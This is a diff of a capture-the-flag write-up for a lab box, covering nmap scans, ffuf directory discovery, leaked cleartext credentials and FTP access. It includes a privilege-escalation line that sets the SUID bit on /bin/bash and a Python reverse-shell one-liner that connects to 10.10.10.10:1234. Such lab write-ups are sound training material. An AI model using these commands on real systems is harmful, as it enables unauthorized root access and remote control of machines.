@@ -1,14 +1,14 @@
 I started with "sudo ping -c4 10.10.226.228" to make sure I had a connection with the box.
------
+````
 PING 10.10.226.228 (10.10.226.228) 56(84) bytes of data.
 64 bytes from 10.10.226.228: icmp_seq=1 ttl=63 time=53.6 ms
 64 bytes from 10.10.226.228: icmp_seq=2 ttl=63 time=54.3 ms
 64 bytes from 10.10.226.228: icmp_seq=3 ttl=63 time=54.1 ms
 64 bytes from 10.10.226.228: icmp_seq=4 ttl=63 time=55.7 ms
------
+````
 
 Everything seems to be working so let's start with a basic nmap scan.
------
+````
 nmap -p- 10.10.226.228 
 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-30 10:07 EEST
 Nmap scan report for 10.10.226.228
@@ -20,10 +20,10 @@ PORT      STATE SERVICE
 37370/tcp open  unknown
 
 Nmap done: 1 IP address (1 host up) scanned in 18.69 seconds
------
+````
 
 Let's refine that a bit for more information.
------
+````
 nmap -sVC -p22,80,37370 10.10.226.228
 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-30 10:08 EEST
 Nmap scan report for 10.10.226.228
@@ -43,7 +43,7 @@ Service Info: OSs: Linux, Unix; CPE: cpe:/o:linux:linux_kernel
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 11.37 seconds
------
+````
 
 So there is SSH, Apache HTTP server, and FTP server with open ports.
 Let's check the webserver first as we do not have credentials for SSH or FTP.
@@ -51,23 +51,23 @@ The website seems to be for a photography company and there are pricing and gall
 I used ffuf to find more directories "ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://10.10.226.228/FUZZ -ic -t 70"
 Directories found were "gallery, static, pricing". I then used to find more directories with ffuf.
 From the "static" directory ffuf found 18 photos and 1 extra with the name "00" which was a much smaller file than the photos.
------
+````
 dev notes from valleyDev:
 -add wedding photo examples
 -redo the editing on #4
 -remove /dev1243224123123
 -check for SIEM alerts
------
+````
 
 The directory found is a login page. I had ZAP running in the background to catalog everything I went to and the login page loaded "dev.js" which has a function that compares cleartext credentials.
 If you log in with the credentials that the function uses for comparison it opens the "/devNotes37370.txt" file with the following:
------
+````
 dev notes for ftp server:
 -stop reusing credentials
 -check for any vulnerabilies
 -stay up to date on patching
 -change ftp port to normal port
------
+````
 
 As the notes hint, let's try if the plaintext credentials work for the FTP server!
 "ftp 10.10.226.228 37370" with the credentials gets us in and there are three .pcapng files.
@@ -92,4 +92,6 @@ So I added the line "os.system("chmod u+s /bin/bash")" and as it runs as a root 
 There was a "root.txt" in "/root" folder.
 
 I also spent some extra time to get a reverse shell one-liner working! Here it is: 
+````
 import sys,socket,os,pty; s=socket.socket(); s.connect(("10.10.10.10",1234)); [os.dup2(s.fileno(),fd) for fd in (0,1,2)]; pty.spawn("/bin/bash")
+````
